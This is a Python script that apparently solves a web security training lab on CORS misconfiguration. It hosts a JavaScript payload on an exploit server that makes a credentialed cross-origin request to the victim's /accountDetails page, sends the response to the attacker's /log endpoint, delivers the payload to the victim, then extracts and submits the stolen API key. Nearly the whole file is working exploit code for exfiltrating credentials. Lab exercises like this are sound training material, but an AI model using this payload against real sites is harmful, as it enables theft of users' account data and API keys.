import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

burp_headers = {}
requests.get(burp_url, headers=burp_headers)
response = requests.get(burp_url, headers=burp_headers)
match = re.search(r"<a id='exploit-link' class='button' target='_blank' href='(https://exploit-[0-9a-f]+\.exploit-server\.net)'>", response.text)
exploit_server = match.group(1)

responseBody = f'<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open(\'get\',\'{burp_url}/accountDetails\',true);req.withCredentials = true;req.send();function reqListener() {{location=\'/log?key=\' + this.responseText; }}; </script>'

post_data = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
    'responseBody': responseBody,
    'formAction': 'STORE'
}
post_response = requests.post(exploit_server, data=post_data, headers=burp_headers)

last_step = exploit_server + "/deliver-to-victim"
burp0_headers = {}
final_response = requests.get(last_step, headers=burp0_headers)

log_response = requests.get(f"{exploit_server}/log", headers=burp0_headers)
log_content = log_response.text

apikey_match = re.search(r'apikey%22:%20%22([a-zA-Z0-9]+)%22', log_content)
if apikey_match:
    api_key = apikey_match.group(1)
    print(f"API Key found: {api_key}")

    # Submit the API key
    submit_response = requests.post(f"{burp_url}/submitSolution", data={'answer': api_key}, headers=burp_headers)
    print(submit_response.text)
